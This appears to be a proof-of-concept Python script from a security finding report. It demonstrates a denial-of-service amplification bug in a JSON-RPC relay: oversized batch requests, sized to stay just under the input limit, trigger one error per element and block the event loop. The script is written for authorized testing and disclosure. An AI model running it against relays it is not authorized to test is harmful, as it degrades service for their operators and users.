#!/usr/bin/env python3
"""
PoC / measurement harness for FINDING-001 — oversized-batch rejection amplification.

Sends batch requests that exceed BATCH_REQUESTS_MAX_SIZE (default 100). The relay
is expected to reject them with `BATCH_REQUESTS_AMOUNT_MAX_EXCEEDED` — the finding
is that it builds a rejection response with ONE error element per element of the
oversized request, so the response is ~80x the request.

IMPORTANT sizing note: the request body must stay STRICTLY UNDER the relay's
INPUT_SIZE_LIMIT (default 1 => co-body limit '1mb' == 1,048,576 bytes). A body of
even 1 byte over is rejected at the JSON parser with HTTP 400 (ParseError) BEFORE
the vulnerable branch runs — that is not the finding, it's just an oversized body.
So we default to 0.95 MB to leave margin.

Two probes:
  A. mechanism proof  — a tiny batch (a few thousand elements). If the response is
     an array whose length == the request's element count, the amplification
     mechanism is confirmed unambiguously, with no size-limit interference.
  B. magnitude + impact — a ~0.95 MB batch, plus concurrent eth_chainId probes to
     measure event-loop blocking (probe latency during vs. baseline).

This is a single-request-per-stage, controlled test — NOT a flood. Run it only
against a relay you operate or are explicitly authorized to test.

Usage:
    RELAY_TARGET_URL=http://127.0.0.1:7546 python poc_batch_amplification.py
    python poc_batch_amplification.py --url http://127.0.0.1:7546 --size-mb 0.95
"""
import argparse
import json
import os
import statistics
import threading
import time
import urllib.error
import urllib.request


def build_batch(n_elements: int) -> bytes:
    """A JSON array of the integer 1 repeated n_elements times: [1,1,...,1]."""
    if n_elements < 1:
        n_elements = 1
    return ("[1" + ",1" * (n_elements - 1) + "]").encode("ascii")


def build_batch_for_size(size_mb: float) -> tuple[bytes, int]:
    """Largest [1,1,...] body that stays at/under size_mb. ~2 bytes/element."""
    target = int(size_mb * 1024 * 1024)
    n = max(1, (target - 2) // 2 + 1)
    body = build_batch(n)
    # guard: never exceed target
    while len(body) > target and n > 1:
        n -= 1
        body = build_batch(n)
    return body, n


def post(url: str, body: bytes, timeout: float):
    """Returns (elapsed, status, data). Captures HTTP error responses (4xx/5xx)
    as real results instead of raising, so a 400 is reported honestly."""
    req = urllib.request.Request(
        url, data=body, headers={"Content-Type": "application/json"}, method="POST"
    )
    t0 = time.monotonic()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            data = resp.read()
            return time.monotonic() - t0, resp.status, data
    except urllib.error.HTTPError as e:
        # 4xx/5xx still carry a body — read it, this is a real result not a failure
        return time.monotonic() - t0, e.code, e.read()


def probe_latency(url: str) -> float:
    body = json.dumps({"jsonrpc": "2.0", "method": "eth_chainId", "params": [], "id": 1}).encode()
    t, _, _ = post(url, body, timeout=30)
    return t


def classify(request_n: int, status: int, data: bytes) -> str:
    """Decide what the response means for the finding."""
    try:
        parsed = json.loads(data)
    except Exception:
        return f"NON-JSON response ({len(data)} bytes) — inconclusive (proxy truncation?)."

    if isinstance(parsed, list):
        if len(parsed) == request_n:
            return (f"AMPLIFICATION CONFIRMED — response is an array of {len(parsed):,} "
                    f"elements, one per request element.")
        return (f"Response is an array of {len(parsed):,} elements "
                f"(request had {request_n:,}) — partial/unexpected, inspect manually.")

    if isinstance(parsed, dict):
        msg = str(parsed.get("error", {}).get("message", "")).lower()
        if "parse" in msg or (status == 400 and "batch request amount" not in msg):
            return ("NOT the finding — relay returned a SINGLE parse/bad-request error. "
                    "Body likely exceeded INPUT_SIZE_LIMIT; lower --size-mb and retry.")
        if "batch request amount" in msg:
            return ("MITIGATED/DIFFERENT — relay returns a SINGLE batch-too-large error "
                    "(no per-element amplification). This is the fixed/safe behavior.")
        return f"Single JSON object response (status {status}) — inspect: {msg[:120]}"
    return "Unexpected response shape — inspect manually."


def stage(name: str, url: str, body: bytes, request_n: int, timeout: float, with_probes: bool, probe_workers: int):
    print(f"\n--- {name} ---")
    print(f"Request: {len(body)/1024/1024:.4f} MB, {request_n:,} elements")

    probe_latencies: list[float] = []
    stop = threading.Event()
    workers = []
    if with_probes:
        def worker():
            while not stop.is_set():
                try:
                    probe_latencies.append(probe_latency(url))
                except Exception:
                    probe_latencies.append(float("nan"))
                time.sleep(0.02)
        workers = [threading.Thread(target=worker, daemon=True) for _ in range(max(1, probe_workers))]
        for w in workers:
            w.start()

    elapsed, status, data = post(url, body, timeout=timeout)
    if with_probes:
        stop.set()
        time.sleep(0.25)

    resp_mb = len(data) / 1024 / 1024
    amp = len(data) / max(1, len(body))
    print(f"HTTP status:          {status}")
    print(f"Response size:        {resp_mb:.3f} MB")
    print(f"Amplification factor: {amp:.0f}x")
    print(f"Relay answer time:    {elapsed*1000:.0f} ms")

    during = [x for x in probe_latencies if x == x]
    if with_probes and during:
        print(f"Concurrent-probe latency during request: "
              f"median {statistics.median(during)*1000:.1f} ms | max {max(during)*1000:.1f} ms | n={len(during)}")

    print(f"Verdict: {classify(request_n, status, data)}")
    return status, len(data), amp, during


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--url", default=os.environ.get("RELAY_TARGET_URL", "http://127.0.0.1:7546"))
    ap.add_argument("--size-mb", type=float, default=0.95,
                    help="big-request body size; MUST be < INPUT_SIZE_LIMIT (default relay limit is 1 MB)")
    ap.add_argument("--mechanism-elements", type=int, default=5000,
                    help="element count for the tiny mechanism-proof request (>> BATCH_REQUESTS_MAX_SIZE)")
    ap.add_argument("--timeout", type=float, default=120.0)
    ap.add_argument("--probe-workers", type=int, default=4)
    args = ap.parse_args()

    print(f"Target: {args.url}")
    print("NOTE: run only against a relay you are authorized to test.")

    # Baseline
    print("\nMeasuring baseline eth_chainId latency (relay idle)...")
    try:
        baseline = statistics.median([probe_latency(args.url) for _ in range(8)])
        print(f"  baseline median: {baseline*1000:.1f} ms")
    except Exception as e:
        print(f"  baseline probe failed: {e!r}")
        baseline = float("nan")

    # Stage A: mechanism proof (tiny body, no size-limit confound)
    body_a = build_batch(args.mechanism_elements)
    stage("Stage A: mechanism proof (tiny body)", args.url, body_a, args.mechanism_elements,
          args.timeout, with_probes=False, probe_workers=0)

    # Stage B: magnitude + event-loop impact (~0.95 MB)
    body_b, n_b = build_batch_for_size(args.size_mb)
    _, _, _, during = stage("Stage B: magnitude + impact (~0.95 MB)", args.url, body_b, n_b,
                            args.timeout, with_probes=True, probe_workers=args.probe_workers)

    if during and baseline == baseline:
        infl = statistics.median(during) / baseline
        print(f"\nEvent-loop impact: baseline {baseline*1000:.1f} ms -> during "
              f"{statistics.median(during)*1000:.1f} ms  (x{infl:.1f} median inflation)")

    print("\nInterpretation:")
    print("  - Stage A array length == its element count  => amplification mechanism is real.")
    print("  - Stage B large factor + probe-latency spike => event-loop-blocking DoS (Medium).")
    print("  - Stage A/B single-error response            => already mitigated; do NOT submit.")
    print("  - Stage B 400 'parse' error                  => body over INPUT_SIZE_LIMIT; lower --size-mb.")


if __name__ == "__main__":
    main()
